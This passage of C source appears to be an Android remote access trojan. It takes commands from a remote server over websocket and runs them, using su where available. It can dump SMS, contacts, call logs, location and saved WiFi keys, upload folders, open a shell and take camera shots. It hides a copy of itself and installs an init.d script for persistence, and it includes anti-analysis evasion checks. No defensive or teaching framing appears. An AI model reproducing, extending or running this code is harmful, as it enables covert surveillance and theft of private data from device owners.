    snprintf(cmd, sizeof(cmd), "tar -czf '%s' -C '%s' . 2>/dev/null", temp_zip, clean_name);
    int ret = system(cmd);
    
    if (ret != 0 || access(temp_zip, R_OK) != 0) {
        // Try without compression (busybox tar might not have gzip)
        snprintf(temp_zip, sizeof(temp_zip), "/data/local/tmp/.folder_%d.tar", getpid());
        snprintf(cmd, sizeof(cmd), "tar -cf '%s' -C '%s' . 2>/dev/null", temp_zip, clean_name);
        ret = system(cmd);
        
        if (ret != 0 || access(temp_zip, R_OK) != 0) {
            send_websocket_data("[!] Failed to compress folder\n", 30);
            return;
        }
    }
    
    download_file(temp_zip);
    unlink(temp_zip);
}

// ============== COMMAND EXECUTION ==============
void execute_command(const char* cmd) {
    char full_cmd[4096];
    if (g_is_rooted) {
        snprintf(full_cmd, sizeof(full_cmd), "su -c '%s' 2>&1", cmd);
    } else {
        snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd);
    }
    
    FILE* fp = popen(full_cmd, "r");
    if (!fp) {
        send_websocket_data("[!] Command execution failed\n", 29);
        return;
    }
    
    char output[4096];
    while (fgets(output, sizeof(output), fp) != NULL) {
        send_websocket_data(output, strlen(output));
    }
    
    pclose(fp);
}

// ============== SMS (ROOT REQUIRED) ==============
void dump_sms() {
    if (!g_is_rooted) {
        send_websocket_data("[!] SMS dump requires root\n", 27);
        return;
    }
    
    send_websocket_data("[*] Dumping SMS messages...\n", 28);
    
    FILE* fp = popen("su -c 'content query --uri content://sms/inbox --projection address:body:date' 2>/dev/null", "r");
    if (!fp) {
        send_websocket_data("[!] Cannot access SMS database\n", 31);
        return;
    }
    
    char line[4096];
    int count = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        send_websocket_data(line, strlen(line));
        count++;
    }
    
    pclose(fp);
    
    char msg[64];
    snprintf(msg, sizeof(msg), "\n[+] Dumped %d SMS messages\n", count);
    send_websocket_data(msg, strlen(msg));
}

// ============== CONTACTS (ROOT REQUIRED) ==============
void dump_contacts() {
    if (!g_is_rooted) {
        send_websocket_data("[!] Contacts dump requires root\n", 32);
        return;
    }
    
    send_websocket_data("[*] Dumping contacts...\n", 24);
    
    FILE* fp = popen("su -c 'content query --uri content://contacts/phones --projection display_name:number' 2>/dev/null", "r");
    if (!fp) {
        send_websocket_data("[!] Cannot access contacts database\n", 36);
        return;
    }
    
    char line[4096];
    int count = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        send_websocket_data(line, strlen(line));
        count++;
    }
    
    pclose(fp);
    
    char msg[64];
    snprintf(msg, sizeof(msg), "\n[+] Dumped %d contacts\n", count);
    send_websocket_data(msg, strlen(msg));
}

// ============== CALL LOG (ROOT REQUIRED) ==============
void dump_call_log() {
    if (!g_is_rooted) {
        send_websocket_data("[!] Call log dump requires root\n", 32);
        return;
    }
    
    send_websocket_data("[*] Dumping call log...\n", 24);
    
    FILE* fp = popen("su -c 'content query --uri content://call_log/calls --projection number:date:duration:type' 2>/dev/null", "r");
    if (!fp) {
        send_websocket_data("[!] Cannot access call log\n", 27);
        return;
    }
    
    char line[4096];
    int count = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        send_websocket_data(line, strlen(line));
        count++;
    }
    
    pclose(fp);
    
    char msg[64];
    snprintf(msg, sizeof(msg), "\n[+] Dumped %d call records\n", count);
    send_websocket_data(msg, strlen(msg));
}

// ============== INSTALLED APPS ==============
void list_apps() {
    send_websocket_data("[*] Listing installed apps...\n\n", 31);
    
    FILE* fp = popen("pm list packages -f 2>/dev/null", "r");
    if (!fp) {
        send_websocket_data("[!] Cannot list packages\n", 25);
        return;
    }
    
    char line[512];
    int count = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        send_websocket_data(line, strlen(line));
        count++;
    }
    
    pclose(fp);
    
    char msg[64];
    snprintf(msg, sizeof(msg), "\n[+] Total: %d apps\n", count);
    send_websocket_data(msg, strlen(msg));
}

// ============== WIFI INFO ==============
void get_wifi_info() {
    send_websocket_data("\n=== WiFi Information ===\n", 26);
    
    // Current connection
    execute_command("dumpsys wifi | grep 'mWifiInfo' | head -5 2>/dev/null || iwconfig 2>/dev/null");
    
    // Saved networks (root)
    if (g_is_rooted) {
        send_websocket_data("\n--- Saved Networks ---\n", 24);
        execute_command("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -E 'ConfigKey|PreSharedKey'");
    }
    
    send_websocket_data("\n", 1);
}

// ============== LOCATION ==============
void get_location() {
    if (!g_is_rooted) {
        send_websocket_data("[!] Location requires root\n", 27);
        return;
    }
    
    send_websocket_data("[*] Getting location...\n", 24);
    execute_command("dumpsys location | grep -E 'mLastLocation|Latitude|Longitude' | head -10 2>/dev/null");
}

// ============== PERSISTENCE ==============
void enable_persistence() {
    char exe_path[4096];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        send_websocket_data("[!] Failed to get executable path\n", 34);
        return;
    }
    exe_path[len] = '\0';
    
    // Copy to hidden location
    char hidden_exe[256] = "/data/local/tmp/.system_service";
    
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s' 2>/dev/null", exe_path, hidden_exe);
    system(cmd);
    chmod(hidden_exe, 0755);
    
    // Create init.d script if rooted
    if (g_is_rooted) {
        snprintf(cmd, sizeof(cmd), 
            "su -c 'mkdir -p /system/etc/init.d; "
            "echo \"#!/system/bin/sh\" > /system/etc/init.d/99service; "
            "echo \"%s &\" >> /system/etc/init.d/99service; "
            "chmod 755 /system/etc/init.d/99service' 2>/dev/null",
            hidden_exe
        );
        system(cmd);
        send_websocket_data("[+] Init.d script installed\n", 28);
    }
    
    send_websocket_data("[+] Persistence installed at: ", 30);
    send_websocket_data(hidden_exe, strlen(hidden_exe));
    send_websocket_data("\n", 1);
}

void disable_persistence() {
    system("rm -f /data/local/tmp/.system_service 2>/dev/null");
    
    if (g_is_rooted) {
        system("su -c 'rm -f /system/etc/init.d/99service' 2>/dev/null");
    }
    
    send_websocket_data("[+] Persistence removed\n", 24);
}

// ============== COMMAND HANDLER ==============
void handle_command(const char* cmd) {
    while (*cmd == ' ' || *cmd == '\t') cmd++;
    char clean_cmd[4096];
    strncpy(clean_cmd, cmd, sizeof(clean_cmd) - 1);
    clean_cmd[sizeof(clean_cmd) - 1] = '\0';
    
    int len = strlen(clean_cmd);
    while (len > 0 && (clean_cmd[len-1] == '\n' || clean_cmd[len-1] == '\r' || clean_cmd[len-1] == ' ')) {
        clean_cmd[--len] = '\0';
    }
    
    if (len == 0) return;
    
    if (strcmp(clean_cmd, "screenshot") == 0) {
        take_screenshot();
    }
    else if (strcmp(clean_cmd, "shell") == 0) {
        shell_session();
    }
    else if (strcmp(clean_cmd, "ps") == 0) {
        list_processes();
    }
    else if (strncmp(clean_cmd, "download ", 9) == 0) {
        download_file(clean_cmd + 9);
    }
    else if (strncmp(clean_cmd, "downloadfolder ", 15) == 0 || strncmp(clean_cmd, "dldir ", 6) == 0) {
        char* path = (strncmp(clean_cmd, "downloadfolder ", 15) == 0) ? (char*)clean_cmd + 15 : (char*)clean_cmd + 6;
        download_folder(path);
    }
    else if (strncmp(clean_cmd, "cmd ", 4) == 0) {
        execute_command(clean_cmd + 4);
    }
    else if (strncmp(clean_cmd, "cd ", 3) == 0) {
        if (chdir(clean_cmd + 3) == 0) {
            getcwd(g_current_dir, sizeof(g_current_dir));
            char msg[4096];
            snprintf(msg, sizeof(msg), "[+] Changed to: %s\n", g_current_dir);
            send_websocket_data(msg, strlen(msg));
        } else {
            send_websocket_data("[!] Directory change failed\n", 28);
        }
    }
    else if (strcmp(clean_cmd, "pwd") == 0) {
        char msg[4096];
        snprintf(msg, sizeof(msg), "%s\n", g_current_dir);
        send_websocket_data(msg, strlen(msg));
    }
    else if (strcmp(clean_cmd, "sysinfo") == 0 || strcmp(clean_cmd, "deviceinfo") == 0) {
        send_device_info();
    }
    else if (strcmp(clean_cmd, "sms") == 0) {
        dump_sms();
    }
    else if (strcmp(clean_cmd, "contacts") == 0) {
        dump_contacts();
    }
    else if (strcmp(clean_cmd, "calllog") == 0) {
        dump_call_log();
    }
    else if (strcmp(clean_cmd, "apps") == 0) {
        list_apps();
    }
    else if (strcmp(clean_cmd, "wifi") == 0) {
        get_wifi_info();
    }
    else if (strcmp(clean_cmd, "location") == 0) {
        get_location();
    }
    else if (strcmp(clean_cmd, "listcam") == 0 || strcmp(clean_cmd, "listcams") == 0 || strcmp(clean_cmd, "cameras") == 0) {
        list_cameras();
    }
    else if (strncmp(clean_cmd, "selectcam ", 10) == 0 || strncmp(clean_cmd, "usecam ", 7) == 0) {
        int index = 0;
        char* params = (strncmp(clean_cmd, "selectcam ", 10) == 0) ? (char*)clean_cmd + 10 : (char*)clean_cmd + 7;
        while (*params == ' ') params++;
        if (*params) {
            sscanf(params, "%d", &index);
        }
        select_camera(index);
    }
    else if (strcmp(clean_cmd, "camshot") == 0 || strcmp(clean_cmd, "camsnap") == 0) {
        take_camshot();
    }
    else if (strcmp(clean_cmd, "persist") == 0) {
        enable_persistence();
    }
    else if (strcmp(clean_cmd, "unpersist") == 0) {
        disable_persistence();
    }
    else if (strcmp(clean_cmd, "exit") == 0) {
        send_websocket_data("[*] Exiting...\n", 15);
        g_should_exit = 1;
    }
    else if (strcmp(clean_cmd, "help") == 0) {
        char* help = 
            "\nAvailable commands (Android):\n"
            "  screenshot         - Take screenshot (needs shell/root)\n"
            "  listcam            - List available cameras\n"
            "  selectcam <n>      - Select camera (0=back, 1=front)\n"
            "  camshot            - Take camera photo\n"
            "  shell              - Interactive shell\n"
            "  ps                 - List processes\n"
            "  download <file>    - Download file from device\n"
            "  downloadfolder <p> - Download entire folder as tar.gz\n"
            "  cmd <command>      - Execute single command\n"
            "  cd <path>          - Change directory\n"
            "  pwd                - Current directory\n"
            "  sysinfo            - Device information (shows ClientID)\n"
            "  apps               - List installed apps\n"
            "  wifi               - WiFi information\n"
            "  sms                - Dump SMS messages (root)\n"
            "  contacts           - Dump contacts (root)\n"
            "  calllog            - Dump call history (root)\n"
            "  location           - Get device location (root)\n"
            "  persist            - Install persistence\n"
            "  unpersist          - Remove persistence\n"
            "  exit               - Exit session (client reconnects)\n"
            "  help               - This help\n\n";
        send_websocket_data(help, strlen(help));
    }
    else {
        char msg[512];
        snprintf(msg, sizeof(msg), "[!] Unknown command: '%s'. Type 'help' for commands.\n", clean_cmd);
        send_websocket_data(msg, strlen(msg));
    }
}

// ============== SESSION HANDLER ==============
void handle_session() {
    char buffer[BUFFER_SIZE];
    char recv_buffer[BUFFER_SIZE * 2];
    int recv_buffer_len = 0;
    
    // Start ping thread
    g_ping_running = 1;
    pthread_create(&g_ping_thread, NULL, ping_thread_func, NULL);
    
    // Send connection info
    char* model = get_android_prop("ro.product.model");
    char* android_ver = get_android_prop("ro.build.version.release");
    
    char connect_msg[1024];
    snprintf(connect_msg, sizeof(connect_msg),
        "\n[+] Android Client Connected\n"
        "[+] Device: %s | Android %s\n"
        "[+] ClientID: %s\n"
        "[+] Rooted: %s\n"
        "[+] Directory: %s\n\n",
        model, android_ver, g_client_id,
        g_is_rooted ? "Yes" : "No",
        g_current_dir
    );
    send_websocket_data(connect_msg, strlen(connect_msg));
    
    // Create loot directory
    system("mkdir -p /data/local/tmp/loot 2>/dev/null");
    
    // Main receive loop
    while (g_connected && !g_should_exit) {
        fd_set readfds;
        struct timeval tv;
        
        FD_ZERO(&readfds);
        FD_SET(g_sock, &readfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int ret = select(g_sock + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) break;
        if (ret == 0) continue;
        
        if (FD_ISSET(g_sock, &readfds)) {
            int len = recv(g_sock, buffer, sizeof(buffer) - 1, 0);
            if (len <= 0) {
                g_connected = 0;
                break;
            }
            
            if (recv_buffer_len + len < sizeof(recv_buffer)) {
                memcpy(recv_buffer + recv_buffer_len, buffer, len);
                recv_buffer_len += len;
            }
            
            while (recv_buffer_len > 0) {
                char output[BUFFER_SIZE];
                int output_len;
                
                int consumed = parse_websocket_frame((unsigned char*)recv_buffer, recv_buffer_len, output, &output_len);
                if (consumed <= 0) break;
                
                memmove(recv_buffer, recv_buffer + consumed, recv_buffer_len - consumed);
                recv_buffer_len -= consumed;
                
                if (output_len > 0) {
                    handle_command(output);
                }
            }
        }
    }
    
    g_ping_running = 0;
    pthread_join(g_ping_thread, NULL);
}

// ============== MAIN ==============
int main(int argc, char* argv[]) {
    signal(SIGPIPE, SIG_IGN);
    
    // AV Evasion: Delayed start with random jitter
    delayed_start();
    
    // AV Evasion: Check for analysis environment
    if (run_evasion_checks()) {
        // If suspicious, wait longer and check again
        sleep(30);
        if (run_evasion_checks()) {
            // Still suspicious - exit quietly
            exit(0);
        }
    }
    
    // Daemonize
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Get device info
    char* hostname = get_android_prop("ro.product.device");
    strncpy(g_hostname, strlen(hostname) > 0 ? hostname : "android", sizeof(g_hostname) - 1);
    
    char* user = getenv("USER");
    if (!user) user = "shell";
    strncpy(g_username, user, sizeof(g_username) - 1);
    
    getcwd(g_current_dir, sizeof(g_current_dir));
    if (strlen(g_current_dir) == 0) {
        strcpy(g_current_dir, "/data/local/tmp");
        chdir(g_current_dir);
    }
    
    g_session_id = getpid() ^ time(NULL);
    g_is_rooted = check_root();
    
    // Initialize unique client ID
    init_client_id();
    
    // Main connection loop
    while (1) {
        g_connected = 0;
        g_should_exit = 0;
        
        // Periodic evasion check
        static int loop_count = 0;
        if (++loop_count % 10 == 0) {
            if (run_evasion_checks()) {
                sleep(60);  // Wait if suspicious
                continue;
            }
        }
        
        while (!g_connected) {
            if (connect_to_server()) {
                handle_session();
                cleanup_socket();
            }
            
            sleep(RECONNECT_DELAY);
        }
    }
    
    return 0;
}
